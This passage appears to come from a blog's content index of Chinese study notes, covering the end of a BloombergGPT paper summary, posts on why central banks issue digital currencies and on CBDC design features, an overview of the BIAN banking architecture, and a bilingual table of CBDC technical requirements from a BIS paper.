<h4 id="定性评估"><a href="#定性评估" class="headerlink" title="定性评估"></a>定性评估</h4><p>作者在文章的第6章还展示了对BloombergGPT定性评估的例子，以展示模型在专业领域带来的促进作用。<br>这些列子包括：</p>
<ul>
<li>BQL（Bloomberg查询语言）生成，即使用自然语言完成Bloomberg数据库查询，类似NL2SQL</li>
<li>新闻标题提示，辅助记者生成新闻短标题</li>
<li>金融问答</li>
</ul>
<h3 id="6-道德伦理、限制与研究意义"><a href="#6-道德伦理、限制与研究意义" class="headerlink" title="6.道德伦理、限制与研究意义"></a>6.道德伦理、限制与研究意义</h3><p>这一章没有太多值得写的，主要就是强调了目前大语言模型可能会生成有害的、有偏见的内容，并且可能存在prompt注入导致信息泄露的风险，Bloomberg在使用大语言模型前后都会做好风控，保证生成内容的准确性。<br>同时，<strong>BloogbergGPT模型不会被公开，但是模型训练和评估的相关经验和思考会被分享出来</strong>。</p>
<h3 id="7-总结与展望"><a href="#7-总结与展望" class="headerlink" title="7.总结与展望"></a>7.总结与展望</h3><p>文章提出了BloombergGPT——一个金融领域顶级的LLM，并且在训练特定领域大语言模型做出了如下贡献：</p>
<ul>
<li><strong>使用领域数据和通用数据的训练方式可以让模型在这两个方面得到平衡的结果</strong></li>
<li>模型参数量参考了Chinchilla scaling laws</li>
<li>公布了相关训练细节</li>
</ul>
<p>下一步，作者们会在以下方向继续研究：</p>
<ul>
<li>金融领域的fine-tuning</li>
<li>使用更无害和更无偏见的语言</li>
<li>研究tokenization方法对模型结果的影响</li>
</ul>
<p>最后，作者把模型取得目前效果归结于以下三个因素（按影响从高到低排序）：</p>
<ul>
<li><strong>精心清洗的内部数据集</strong></li>
<li><strong>tokenizer的选择</strong></li>
<li><strong>流行的模型结构</strong></li>
</ul>
]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>CBDC-I-为什么需要CBDC</title>
    <url>/2021/12/10/CBDC-I-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81CBDC/</url>
    <content><![CDATA[<p><a href="https://core.ac.uk/reader/288306889">Central bank digital currency (CBDC) : an explorative study on its impact and implications for monetary policy and the banking sector </a></p>
<p>原因一：Barontini 和 Holden（2019 年）早些时候引用的调查发现，实施数字货币的最重要动力是<strong>支付安全和国内效率</strong>。对于批发 CBDC 而言，普惠金融是最不重要的因素，而跨境支付效率在零售 CBDC 中排名最低（Barontini &amp; Holden，2019 年）。发达经济体和新兴市场的央行之间也存在显着差异。OMFIF 和 IBM 2018年进行的一项调查发现，大多数受访者追求 <strong>wholesale CBDC 的主要动机是提高速度和成本效率</strong>的潜力。OMFIF 和 IBM 2019年还发布了一项关于 <strong>retail CBDC 动机</strong>的调查，受访者表示，<strong>维持有竞争力的支付系统和更好地实施反洗钱</strong>是主要的原因。中央银行想要发行 CBDC 的原因有很多，本节将考虑其中的大部分。</p>
<p>原因二：Barrdear 和 Kumhof (2016年) 分析了美国经济的动态随机一般均衡模型，发现采用 **CBDC 使实际 GDP 提高了约 3%**。</p>
<p>原因三：<strong>支付技术（例如加密货币市场、Facebook 的 Libra 计划和其他私营电子货币）近期和未来的快速创新可能最终使它们成为未来几年中央银行发行的法定货币的主要竞争者</strong>。如果这些私营货币获得足够大的用户群，可能会影响中央银行控制货币供应量、执行货币政策和维持金融稳定的能力（Bordo &amp; Levin，2017）。例如：如果政府使用法定货币发行社会福利，而私营电子货币垄断支付，这可能会产生社会福利成本，公民获得的福利也可能受到影响。另一个问题是，提供私营货币服务的公司专注于利润最大化，因此，私营发行电子货币的激励措施与法定货币的目的不一致（Ward &amp; Rochemont，2019 年）。鉴于这些考虑，许多中央银行正在考虑引入 CBDC 以做应对。与实物现金不同，CBDC 可能会与技术的快速发展更加协调，并可以帮助中央银行保持对货币供应的控制（Bordo &amp; Levin，2017 年）。最后，CBDC 不需要尝试垄断支付市场，而是可以作为对私营实体提供的服务的补充。CBDC 可以确保准垄断不会出现在支付市场上（Bordo &amp; Levin，2017 年）。</p>
<p>原因四：提升跨境支付效率</p>
<p>原因五：<strong>使用 CBDC 来改善金融稳定性</strong>。许多国家的金融体系以高杠杆银行为特色，其中流动性和期限转换是支付系统的核心。商业银行发行的债权（商业银行货币）既用作交换媒介又用作价值储存。这些要求被称为“内部货币”，当经济中出现不利的负外部性时，可能会相对不稳定。<strong>CBDC（“外部货币”）根据其设计，将被用作交换媒介和价值储存手段，并可以降低金融部门的整体风险</strong>。这一特性是由于 CBDC 几乎没有风险。从银行存款到 CBDC 的可能转变也可能对银行资金和信贷准备金产生影响，这也会影响稳定性（OMFIF 和 IBM 2019）。如果 CBDC 设计为有息的，并且在取消这种纸币的基础上，还可以采用更先进的货币政策。这种设计可以消除 ZLB 的约束，也可以忽略“通胀缓冲”（Bordo &amp; Levin 2017）。</p>
<p>原因六：铸币税是中央银行预算的一个组成部分。加拿大银行进行的研究发现，随着现金使用量的下降，一些中央银行已经看到他们铸币税收入减少（Ward &amp; Rochemont，2019 年）。采用外币（通常是美元）作为国内交换手段的国家面临着类似的问题，放弃了潜在收入。对于以美元为主要货币的经济体来说，CBDC 可能是一种重新获得一些铸币税的经济体，而发达经济体可以增加其收入（OMFIF 和 IBM 2019）。这种影响取决于 CBDC 的设计决策。对于美元化的经济体，CBDC 可以提供一种重新获得对其国内货币体系更大控制权的手段。马绍尔群岛就是这样一个经济体，目前正在开发一种名为“主权”的数字货币，因为他们试图重新获得货币主权。然而，<strong>在 OMFIF 和 IBM 的研究中，66% 的受访者认为 CBDC 对铸币税的影响很小，需要进一步研究以充分了解影响</strong>（OMFIF 和 IBM 2019）</p>
<p>原因七：CBDC 的广泛使用与纸币的过时相结合，可能有助于阻止逃税、洗钱和恐怖主义融资等非法活动。发达经济体的收益可能很大，但对于大部分经济活动都是用现金完成的新兴经济体来说更是如此，从而导致逃税率很高。根据 CBDC 的设计，小额交易可以相对匿名地进行，而更大量的交易则需要有经过验证的身份与之相关联（Bordo &amp; Levin 2017）。如果 CBDC 采用基于代币的形式，具有类似现金的离线支付可能性，追踪将很困难。但是，<strong>现有的法规可以在匿名性和可追溯性之间找到可靠的平衡</strong>。这些是管理卡支付的规则，欧洲洗钱指令要求这些规则限制这种风险，并可能适用于 CBDC。从更广泛的意义上讲，<strong>用 CBDC 代替现金可以帮助当局采取反洗钱措施和打击非法活动</strong>（OMFIF 和 IBM 2019）。</p>
<p>原因八：<strong>随着有息 CBDC 的引入，银行系统的竞争力可以提高</strong>。Bordo &amp; Levin 2017)年指出从事“relationship banking”的机构可能不会受到影响。然而，其他竞争力较弱的机构可能会失去存款，因为用户可以选择将资金转移到 CBDC（Wadsworth，2018b）。CBDC 还可以替代纸币、借记卡和信用卡、支票和其他实物支付方式。因此，零售支付的可竞争性可能会增加，并且由于在银行和企业之间使用 CBDC 进行大额交易是可能的，它可以在批发支付行业提供更多竞争。通过实施上述货币，它可以促进更广泛的直觉访问中央银行的资产负债表。反过来，这种准入可以使公司更容易进入支付市场，从而增加竞争（Engert &amp; Fung，2017 年）。</p>
<p>原因八：国际货币基金组织和国际清算银行表明，金融包容性是新兴市场和发展中国家的主要动力之一（Rochon 等人，2018 年；Barontini &amp; Holden，2019 年）。这种好处是专门针对零售 CBDC 的。世界银行表示，有 17 亿人没有银行账户，他们无法使用商业银行或账户，主要是在发展中国家（Demirguc-Kunt、Klapper、Singer、Ansar 和 Hess，2017 年）。零售 CBDC 可以促进这些经济体的数字化，从而促进社会和经济发展（Shirai，2019 年）。有一种观点认为，金融包容性是减少贫困的重要方式，因为银行账户对于扩大业务和提高交易效率和安全性至关重要（Adrian，2019 年）。还有其他方法可以在不使用 CBDC 的情况下实现这种类型的包容。肯尼亚的 M-Pesa 和秘鲁的 Modelo 就是这样一种支付机制，可以在不依赖 CBDC 的情况下增加包容性。对于大多数发达经济体来说，金融包容性并不是一个值得注意的问题。2014 年，经合组织高收入国家 94% 的成年人表示他们拥有银行账户。因此，<strong>新兴经济体对通过 CBDC 实现金融包容性更感兴趣</strong>（Hodgson，2017 年）。</p>
]]></content>
      <tags>
        <tag>CBDC</tag>
      </tags>
  </entry>
  <entry>
    <title>CBDC-II-共性的需求</title>
    <url>/2021/12/13/CBDC-II-%E5%85%B1%E6%80%A7%E7%9A%84%E9%9C%80%E6%B1%82/</url>
    <content><![CDATA[<p>Central Bank Digital Currency === Digital Fiat Currency === Digital base money === Central Bank E-money. “a widely accessible digital form of fiat money that could be legal tender”(IMF defines). </p>
<p><strong>Money</strong> is a recognized medium of exchange for goods and services. <strong>Money supply</strong> depicts a form of money known as MB or M0.  <strong>Commercial bank money</strong>  is a form of money that is a claim on financial institutions that can be used to purchase goods and services. <strong>Commercial money supply</strong> depicts this form of money as M1-M3. <strong>Central bank digital currency (CBDC)</strong> would represent a stake on the issuing governments M0 money supply in a digital form.</p>
<p>Three functions of money:</p>
<ol>
<li>A unit of account </li>
<li>Medium of exchange </li>
<li>Store of value </li>
</ol>
<p>那么CBDC与上述money相比较，有何不同</p>
<ol>
<li>同样，CBDC would need to have a 1:1 ratio with the current M0 money supply and maintain the current value of fiat money. </li>
<li>同样，CBDC是交换媒介，它需要被广泛接受，并且保护消费者，减少纳税人的成本。</li>
</ol>
<p>综上，得到<strong>CBDC design (five) features</strong>：</p>
<p><img src="/2021/12/13/CBDC-II-%E5%85%B1%E6%80%A7%E7%9A%84%E9%9C%80%E6%B1%82/1.png" alt="CBDC-II-共性的需求"></p>
<ol>
<li>*<em>7</em>24服务可用**。那么CBDC是应该面相全社会呢？还是仅仅面相金融机构呢？理想答案是全社会每一个人和机构。要根据技术和商业的进步，逐步实施。</li>
<li><strong>匿名性</strong>。首先要看央行对于隐私性的担忧；其次还取决于人们在多大程度上希望减少逃税、洗钱和资助恐怖主义等非法金融交易；最终将成为用户对隐私的偏好与试图降低与财务诚信相关的风险之间的权衡。<ol>
<li>商业银行管理自身的用户的账户和交易，不可以见到其他商业银行的用户账户和无关交易</li>
<li>多家央行相互间可以看见货币发行的总额 ( 经济体量小的国家的喜好？)</li>
</ol>
</li>
<li><strong>转账机制</strong>。使用中间人，例如中央银行或其他第三方，将被视为集中转移机制。点对点方式将被视为一种去中心化的传输机制，因为它发生在两方之间，不需要中央调解器。区块链为上述两种机制都提供了可能性的道路。</li>
<li><strong>利息</strong>。理想的CBDC应该是记息。</li>
<li><strong>发行上限</strong>。对任何个人可以持有或在账户之间转移的 CBDC 数量实施限制或上限，可能有助于阻止与此类资金相关的不良影响。而且在ATM机提取现金的数量也是有上限的。QE同理。</li>
<li>===========================&gt;以下为扩展内容&lt;===========================</li>
<li><strong>审计</strong>。交易可追溯。</li>
<li><strong>控制</strong>。冻结某账户。</li>
<li><strong>公链扩展</strong>。</li>
<li><strong>中央银行实施监督国内账户以及跨境交易</strong>。</li>
</ol>
<p>Optional features：</p>
<ol>
<li><p>无手机网络的情况下，理想的CBDC应该仍然可以交易。手机未开机的情况下，CBDC无法交易。手表等其他电子设备同理。</p>
</li>
<li><p>反洗钱 / 反资助恐怖主义 / 逃税。在涉嫌违法情况下的交易，被自动终止，无法交易，需要人工介入判断后，再行交易。</p>
</li>
<li><p>KYC。资金运行板块/类别，如ESG。</p>
</li>
<li><p>跨系统交易能力。如区块链跨链以支撑cross board payment。</p>
</li>
<li><p>有效时间限制。如消费券。</p>
</li>
</ol>
<p>Wholesale CBDC的多数业务交易涉及资金和资产的流动，<strong>通过区块链，任何资产的交易，无论是股票、债券还是衍生品，都可以被记录下来，从而允许对分类账进行原子性的记录</strong>。这个过程将资金的全部和最终结算与资产的移动联系起来。</p>
<p>Retail CBDC的两种token存储形式：1）Token存储在本地，DLT Token可以增强这种模型的匿名性(零知识证明，quorum项目的隐私交易通道等技术)，交易不需要第三方，但是如果用户丢失了token，将无法找回；2）Token存储在DLT账本，类似于目前银行的账本。</p>
]]></content>
      <tags>
        <tag>CBDC</tag>
      </tags>
  </entry>
  <entry>
    <title>BIAN学习</title>
    <url>/2023/04/03/BIAN%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>BIAN ( The Banking Industry Architecture Network) 是一个业界多方协作的非营利性组织，由全球领先银行、技术提供商、顾问和学者组成，定义了一个用以简化和标准化核心银行体系结构的银行技术框架。这一框架基于面向服务的架构 (SOA) 原则，银行可以借助 BIAN 参考模型建立起业务能力“积木块”，通过与现有系统进行映射和对接，理清应用之间的边界，从而达成面向服务的、松耦合的未来银行架构。从架构及技术角度看， BIAN 融汇了业界关于银行业务模型和技术体系的积累、结合 SOA 架构和微服务架构理念，基于业务能力、组件及服务而形成的银行应用之间互联互通的技术标准。</p>
<h3 id="BIAN-的业务能力"><a href="#BIAN-的业务能力" class="headerlink" title="BIAN 的业务能力"></a>BIAN 的业务能力</h3><p>从业务架构的角度来看，BIAN 提供了两个重要的企业架构工件，一个是业务能力地图 Business Capability Map，一个是价值链 Value Chain。</p>
<p><img src="/2023/04/03/BIAN%E5%AD%A6%E4%B9%A0/1.png"></p>
<p>BIAN 的业务能力地图构建方式与普通企业架构实践是有区别的。一般情况下，业务架构设计过程中会集中业务和分析师等人员，采用自上而下逐步分解的方式构建业务能力地图。而 BIAN 的业务能力地图，是由一系列已经构建完成的原子级能力，通过映射的方式汇总为业务能力地图。主要的目的是为了与业务架构进行对齐，以适配主流的业务架构分析方法。</p>
<p><img src="/2023/04/03/BIAN%E5%AD%A6%E4%B9%A0/2.png"></p>
<p>服务域（BIAN 称为 Service Domain，俺称为原子能力）代表一组离散的、原子的（唯一/不重叠的）业务功能，它们构成了任何银行的功能构建块 （Functional Building Blocks），用于为解决方案的开发提供业务功能框架。服务域和业务能力为明显不同的目的而将业务区分开来。服务域是一种功能细分，旨在提供一个开发/部署框架。业务能力代表了不同的业务所拥有的能力，目的是制定和实施业务战略。</p>
<p><img src="/2023/04/03/BIAN%E5%AD%A6%E4%B9%A0/3.jpg"></p>
<p>BIAN 服务域可以被认为是 “对某物做某事的能力”，专注于对一个业务对象所执行的操作。BIAN 服务域是原子性的，这意味着 “代表了可以被服务化的最小实际能力或功能分区。” 换句话讲，一个服务域将封装适合（被封装到） IT 服务中的最小实际业务功能 Business Functionality 。在某些情况下，服务域直接（或几乎）与业务能力相一致；然而，由于服务域是面向功能的，它们通常与价值流 Value Stream 有关，或者更经常地与价值流阶段 Value Stream Stage（或其一部分）有关。</p>
<h3 id="BIAN-的价值链"><a href="#BIAN-的价值链" class="headerlink" title="BIAN 的价值链"></a>BIAN 的价值链</h3><p>BIAN 的价值链并不是真正的价值链，因为价值链是要进行更下一步分解的，但是 BIAN 仅分解到第 2 层就戛然而止。BIAN 使用价值链视图的真正目的，是给银行另外一个看待原子业务能力的视角。</p>
<h3 id="BIAN-到底是什么"><a href="#BIAN-到底是什么" class="headerlink" title="BIAN 到底是什么"></a>BIAN 到底是什么</h3><p>经过多年积累，BIAN 为银行业务构建了一批原子业务能力，使银行在信息化建设的过程中可以利用 BIAN 的行业框架，依据自身实际情况进行调优后，便捷高效地实施数字化战略。BIAN 构建了便于业务侧理解的业务能力地图与价值链，将原子业务能力通过映射的方式与两个业务架构中的关键工件进行关联，从而实现银行的业务与 IT 对齐。原子能力便于组装的特性，极大地促进了业务侧的创新与调整；通过统一规范的接口，为银行铺就了一条互联互通的开放之路。</p>
<ol>
<li>业务颗粒度（业务价值），架构颗粒度（UML建模），API，都已经是一套完整的设计，作为架构师可以开箱即用。</li>
<li>原本BIAN只是解决银行间互操作的问题，目前已经远远超过了这样子的范围，成为核心银行的架构标杆。</li>
<li>BIAN的设计基于开放银行，充分考虑SaaS模式，这样子的设计架构下，第三方服务可以很容易融入核心银行。例如，salesforce的产品可以很容易地融入核心银行，以完成CRM的功能。</li>
</ol>
<p>参考链接：</p>
<ol>
<li>官网地址 - <a href="https://bian.org/">https://bian.org/</a></li>
<li>BIAN PORTAL - <a href="https://portal.bian.org/dashboard/">https://portal.bian.org/dashboard/</a></li>
<li>最新版servicelandscape（20230403） - <a href="https://bian.org/servicelandscape-11-0-0/">https://bian.org/servicelandscape-11-0-0/</a></li>
</ol>
]]></content>
      <tags>
        <tag>BANK</tag>
      </tags>
  </entry>
  <entry>
    <title>CBDC Architecture</title>
    <url>/2024/08/06/CBDC%20Architecture/</url>
    <content><![CDATA[<p><a href="https://www.bis.org/publ/othp82.pdf">https://www.bis.org/publ/othp82.pdf</a><br>1.Technical requirements for a CBDC architecture.</p>
<table>
<thead>
<tr>
<th>Category</th>
<th>High-level technical requirements</th>
<th>High-priority</th>
</tr>
</thead>
<tbody><tr>
<td>Modular Design - Balance layer</td>
<td>Allows for the creation, possession and destruction of CBDC. 允许创建、拥有和销毁 CBDC。</td>
<td>Y</td>
</tr>
<tr>
<td>Modular Design - Balance layer</td>
<td>Allows for flexible approach, issuing fungible tokens (type 1) and non-fungible tokens (type 2) for specific use cases. 允许采用灵活的方法，为特定用例发行可替代代币（类型 1）和不可替代代币（类型 2）。</td>
<td>Y</td>
</tr>
<tr>
<td>Modular Design - Balance layer</td>
<td>Scalable databases (ledger-keeping infrastructure) to hold resources and on which settlements can be reflected.可扩展的数据库（分类账保存基础设施），用于保存资源并反映结算。</td>
<td></td>
</tr>
<tr>
<td>Modular Design - Balance layer</td>
<td>Connectivity between basic type 1 and type 2 tokenisation infrastructure. 基本类型 1 和类型 2 标记化基础设施之间的连接。</td>
<td></td>
</tr>
<tr>
<td>Modular Design - Settlement layer</td>
<td>Central banks can use parts of existing payment systems or can create a new platform that works in parallel to the existing system. 中央银行可以使用现有支付系统的部分功能，也可以创建与现有系统并行运行的新平台。</td>
<td>Y</td>
</tr>
<tr>
<td>Modular Design - Settlement layer</td>
<td>API infrastructure allows for consent and payment initiation. API 基础设施允许同意和启动付款。</td>
<td>Y</td>
</tr>
<tr>
<td>Modular Design - Settlement layer</td>
<td>Settlement function is highly scalable in terms of the number of transactions, issuers and recipients. 结算功能在交易数量、发行人和接收人方面具有高度的可扩展性。</td>
<td></td>
</tr>
<tr>
<td>Modular Design - Settlement layer</td>
<td>API infrastructure allows for information-sharing (balance and transactions). API 基础设施允许信息共享（余额和交易）。</td>
<td></td>
</tr>
<tr>
<td>Modular Design - Settlement layer</td>
<td>Public wallet through an app that consumes the API architecture described above to serve as a backstop in case other solutions are unavailable. 公共钱包通过使用上述 API 架构的应用程序，在其他解决方案不可用时充当后盾。</td>
<td></td>
</tr>
<tr>
<td>Core functions - Issuance / destruction</td>
<td>Issuance could be considered by transferring resources through the RTGS to an account held by the central bank for this purpose. 可以考虑通过将资源通过 RTGS 转移到中央银行为此目的持有的账户来进行发行。</td>
<td>Y</td>
</tr>
<tr>
<td>Core functions - Issuance / destruction</td>
<td>The previous step would allow for the creation of a token in the type 2 case or to increase the balance of the ledger for a type 1 solution. 上一步将允许在类型 2 的情况下创建令牌，或者增加类型 1 解决方案的分类账余额。</td>
<td>Y</td>
</tr>
<tr>
<td>Core functions - Issuance / destruction</td>
<td>For adequate destruction, tokens in the possession of the central bank are deleted (type 2) or the overall balance is reduced (type 1) solution. 为了充分销毁，删除央行持有的代币（类型2）或者减少整体余额（类型1）的解决方案。</td>
<td>Y</td>
</tr>
<tr>
<td>Core functions - Issuance / destruction</td>
<td>The second step would imply the settlement of a transaction from the issuance account to the general account of the central bank. 第二步是将交易从发行账户结算到央行一般账户。</td>
<td></td>
</tr>
<tr>
<td>Core functions - Issuance / destruction</td>
<td>Both issuance and destruction could work for type 1 and type 2 solutions. 发行和销毁均适用于第 1 类和第 2 类解决方案。</td>
<td></td>
</tr>
<tr>
<td>Core functions - Transaction settlement</td>
<td>Centralised in first stage (only the central bank’s signature can validate transactions after checking ownership and no double spending) 第一阶段集中化（只有中央银行的签名才能在检查所有权后验证交易，并且不会出现双重支付）</td>
<td></td>
</tr>
<tr>
<td>Core functions - Transaction settlement</td>
<td>Adaptable to allow for more signatures to the ecosystem (validate transactions through distributed consensus of approved signatures) 可适应生态系统中更多的签名（通过已批准签名的分布式共识来验证交易）</td>
<td></td>
</tr>
<tr>
<td>Core functions - Payment initiation / account information</td>
<td>API calls to send requests (both information and payment initiation), provided a secure consent mechanism is used. 调用 API 发送请求（信息和付款启动），前提是使用安全的同意机制</td>
<td>Y</td>
</tr>
<tr>
<td>Core functions - Payment initiation / account information</td>
<td>Financial service providers broadly defined should be able to operate and provide services to final users. 广义的金融服务提供商应该能够运营并向最终用户提供服务。</td>
<td>Y</td>
</tr>
<tr>
<td>Core functions - Payment initiation / account information</td>
<td>Uses API architecture to simplify value transfer to other providers and enable access to other financial services. 使用 API 架构简化向其他提供商的价值转移并实现对其他金融服务的访问</td>
<td>Y</td>
</tr>
<tr>
<td>Core functions - Payment initiation / account information</td>
<td>Payment service providers can access CBDC balances in any wallet (not only the one provided by the central bank), upon compliance with regulatory frameworks and security and data privacy principles. 在遵守监管框架和安全及数据隐私原则的前提下，支付服务提供商可以在任何钱包（不仅仅是中央银行提供的钱包）中访问 CBDC 余额。</td>
<td>Y</td>
</tr>
<tr>
<td>Core functions - Payment initiation / account information</td>
<td>Information-sharing protocols and clear message structures to share transactional, aggregated and general information. 信息共享协议和清晰的消息结构，用于共享交易信息、汇总信息和一般信息。</td>
<td></td>
</tr>
<tr>
<td>Core functions - Payment initiation / account information</td>
<td>Secure transactional information treatment.安全的交易信息处理。</td>
<td>Y</td>
</tr>
<tr>
<td>Core functions - Payment initiation / account information</td>
<td>Open architecture to exploit information. 开放式架构以利用信息。</td>
<td></td>
</tr>
<tr>
<td>Core functions - Programmability</td>
<td>Straight through processing of clearing and settlement instructions. 直通式处理清算和结算指令。</td>
<td>Y</td>
</tr>
<tr>
<td>Core functions - Programmability</td>
<td>Implementation on a centralised structure. 按集中式结构实施。</td>
<td></td>
</tr>
<tr>
<td>Core functions - Programmability</td>
<td>Can explore the possibility of a decentralised programmability functionality. 可以探索分布式可编程功能的可能性。</td>
<td></td>
</tr>
<tr>
<td>Core functions - Programmability</td>
<td>Programs/systems that take temporary ownership of assets to allow DvP and PvP settlements, with the option of allowing financial intermediaries and qualified entities to potentially hold assets for settlement purposes. 采取临时资产所有权以允许 DvP 和 PvP 结算的程序/系统，可选择允许金融中介机构和合格实体为结算目的持有资产</td>
<td></td>
</tr>
<tr>
<td>Core functions - Programmability</td>
<td>Conditions or rules to support offline payments are defined. 定义支持离线支付的条件或规则</td>
<td></td>
</tr>
<tr>
<td>Core functions - Programmability</td>
<td>Secure enclaves on phones or other secure hardware to develop an offline functionality with the type 2/tokenised layer of the solution. 手机或其他安全硬件上的安全区域可通过解决方案的类型 2/标记化层开发离线功能。</td>
<td></td>
</tr>
<tr>
<td>Core functions - Programmability</td>
<td>Design focused on simplicity for the final user. 设计注重最终用户的简便性</td>
<td></td>
</tr>
<tr>
<td>Core functions - Programmability</td>
<td>Seamless onboarding of new users or entities onto the CBDC platform that allows for a smooth and efficient registering process. 将新用户或实体无缝加入 CBDC 平台，实现顺畅、高效的注册流程。</td>
<td>Y</td>
</tr>
<tr>
<td>Core functions - Programmability</td>
<td>System is consistent with projects on cross-border functionality by the BIS Innovation Hub. 该系统与 BIS 创新中心的跨境功能项目一致。</td>
<td></td>
</tr>
<tr>
<td>Operational - Scalability</td>
<td>Scalable ledger at the different levels of the system keeping infrastructure that can handle many simultaneous transactions. 系统不同层级的可扩展分类账保持着可以同时处理多笔交易的基础设施。</td>
<td>Y</td>
</tr>
<tr>
<td>Operational - Scalability</td>
<td>Highly scalable settlement infrastructure to fulfil settlement needs within the CBDC record-keeping infrastructure. 高度可扩展的结算基础设施，以满足 CBDC 记录保存基础设施内的结算需求。</td>
<td>Y</td>
</tr>
<tr>
<td>Operational - User experience</td>
<td>Simple onboarding. 简单的注册</td>
<td>Y</td>
</tr>
<tr>
<td>Operational - User experience</td>
<td>Adaptable to allow for private intermediaries to distribute the CBDC to end users or to enable direct participation of end users with the system (public direct-to-customer access). 可适应私人中介机构将 CBDC 分发给最终用户或允许最终用户直接参与系统（公共直接面向客户的访问）</td>
<td>Y</td>
</tr>
<tr>
<td>Operational - User experience</td>
<td>Ability to enable P2P transactions and operate with private intermediaries. 能够实现 P2P 交易并与私人中介机构合作</td>
<td>Y</td>
</tr>
<tr>
<td>Operational - Attribute function matrix on certified permissioned institutions</td>
<td>Matrix is completely controlled by the central bank 监控完全由央行控制</td>
<td>Y</td>
</tr>
<tr>
<td>Operational - Attribute function matrix on certified permissioned institutions</td>
<td>Possibility for distributed consensus in the decentralised transaction settlement for the type 2 case. 第 2 类案例中去中心化交易结算中实现分布式共识的可能性</td>
<td>Y</td>
</tr>
<tr>
<td>Operational - Attribute function matrix on certified permissioned institutions</td>
<td>Dynamic, so that the central bank can modify functions or add new ones. 动态的，以便中央银行可以修改功能或添加新的功能。</td>
<td>Y</td>
</tr>
<tr>
<td>Operational - Interoperability with traditional settlement system and other CBDCs</td>
<td>Architecture allows platform to have modules to interact with different CBDC implementation protocols. 架构允许平台拥有模块来与不同的CBDC实现协议进行交互。</td>
<td></td>
</tr>
<tr>
<td>Operational - Interoperability with traditional settlement system and other CBDCs</td>
<td>Architecture allows platform to have modules to interact with different payment messages (eg domestic, ISO 20022) 架构允许平台拥有与不同支付信息交互的模块（例如国内、ISO 20022）</td>
<td></td>
</tr>
<tr>
<td>Operational - Interoperability with traditional settlement system and other CBDCs</td>
<td>Seamless transfers between commercial bank money and CBDC, and vice versa 商业银行货币与 CBDC 之间的无缝转移，反之亦然</td>
<td></td>
</tr>
<tr>
<td>Operational - Interoperability with traditional settlement system and other CBDCs</td>
<td>CBDC participants in existing payment systems could help in this area 现有支付系统中的 CBDC 参与者可以在这方面提供帮助</td>
<td></td>
</tr>
<tr>
<td>Cyber resilience - Embedded from the beginning of the design</td>
<td>100% available, granting flexibility to adapt to variations in the availability of the supporting infrastructure (eg allowing transactions to be processed once the infrastructure is back online). 100％可用，可灵活适应支持基础设施可用性的变化（例如，一旦基础设施恢复在线，即可处理交易）</td>
<td>Y</td>
</tr>
<tr>
<td>Cyber resilience - Embedded from the beginning of the design</td>
<td>Highest compliance with cyber security standards (eg those of the National Institute of Standards and Technology) 最高程度遵守网络安全标准（例如美国国家标准与技术研究院的标准）</td>
<td>Y</td>
</tr>
<tr>
<td>Cyber resilience - Embedded from the beginning of the design</td>
<td>Modular protocol for settlement instructions to allow for partial or total encryption with separate keys. 结算指令的模块化协议，允许使用单独的密钥进行部分或全部加密</td>
<td>Y</td>
</tr>
<tr>
<td>Cyber resilience - Embedded from the beginning of the design</td>
<td>Allows for separate message fields to keep relevant information encrypted only for those who need to see it. 允许使用单独的消息字段来加密相关信息，只对需要查看的人开放</td>
<td>Y</td>
</tr>
<tr>
<td>Cyber resilience - Embedded from the beginning of the design</td>
<td>Crypto-agile 加密敏捷</td>
<td>Y</td>
</tr>
<tr>
<td>Cyber resilience - Embedded from the beginning of the design</td>
<td>Encryption of databases 数据库加密</td>
<td>Y</td>
</tr>
<tr>
<td>Cyber resilience - Embedded from the beginning of the design</td>
<td>Separates personal information from transactional information in databases 将数据库中的个人信息与交易信息分开</td>
<td>Y</td>
</tr>
<tr>
<td>Cyber resilience - Embedded from the beginning of the design</td>
<td>Distinct levels of data confidentiality. Space for additional data uses, subject to users’ authorisation or sufficient application of privacy preserving techniques. 不同级别的数据保密性。为其他数据使用留出空间，但需获得用户授权或充分应用隐私保护技术。</td>
<td>Y</td>
</tr>
<tr>
<td>Cyber resilience - Embedded from the beginning of the design</td>
<td>Geo-redundancy to mitigate the impact of unexpected events 地理冗余可减轻意外事件的影响</td>
<td></td>
</tr>
<tr>
<td>Cyber resilience - Technological independence</td>
<td>Technology within the modules is easy to modify, replace or update if the information input and the expected output are not modified 如果信息输入和预期输出没有改变，模块内的技术很容易被修改、替换或更新</td>
<td>Y</td>
</tr>
<tr>
<td>Cyber resilience - Technological independence</td>
<td>Inputs and outputs of each module are defined to ensure that changes in the module’s technology would not affect the system (APIs). API endpoints are versioned, with new methods being added as new or overloaded functions 定义每个模块的输入和输出，以确保模块技术的变化不会影响系统（API）。API 端点是版本化的，新方法被添加为新函数或重载函数</td>
<td>Y</td>
</tr>
<tr>
<td>Cyber resilience - Integration</td>
<td>Some modules can be outsourced to the private sector, under two conditions: (i) the central bank must have access to the source code and associated artifacts needed to build the executable module; and (ii) there needs to be an alternative solution in the market to the private entity provider 一些模块可以外包给私营部门，但有两个条件：（i）中央银行必须能够访问构建可执行模块所需的源代码和相关工件；（ii）市场上需要有私人实体提供商的替代解决方案</td>
<td></td>
</tr>
<tr>
<td>Cyber resilience - Integration</td>
<td>Central banks have a perfect view of what is happening within their walls and can intervene and change providers 中央银行对其内部发生的事情了如指掌，并可以进行干预和更换供应商</td>
<td>Y</td>
</tr>
<tr>
<td>Other - Clear path to provide services by third parties</td>
<td>Clear rules of engagement 明确的服务商规则</td>
<td></td>
</tr>
<tr>
<td>Other - Clear path to provide services by third parties</td>
<td>Open architecture for payment initiation 开放式支付架构</td>
<td>Y</td>
</tr>
<tr>
<td>Other - Clear path to provide services by third parties</td>
<td>Open architecture for information-sharing</td>
<td></td>
</tr>
<tr>
<td>Other - Clear path to provide services by third parties</td>
<td>Open API architecture</td>
<td>Y</td>
</tr>
<tr>
<td>Other - Clear path to provide services by third parties</td>
<td>Open API architecture allows financial third parties to provide services based on CBDC</td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>CBDC</tag>
        <tag>BANK</tag>
        <tag>Ethereum</tag>
        <tag>Layer2</tag>
      </tags>
  </entry>
  <entry>
    <title>CS251_Final_Exam_2021-stanford.edu-2</title>
    <url>/2022/03/11/CS251_Final_Exam_2021-stanford.edu-1/</url>
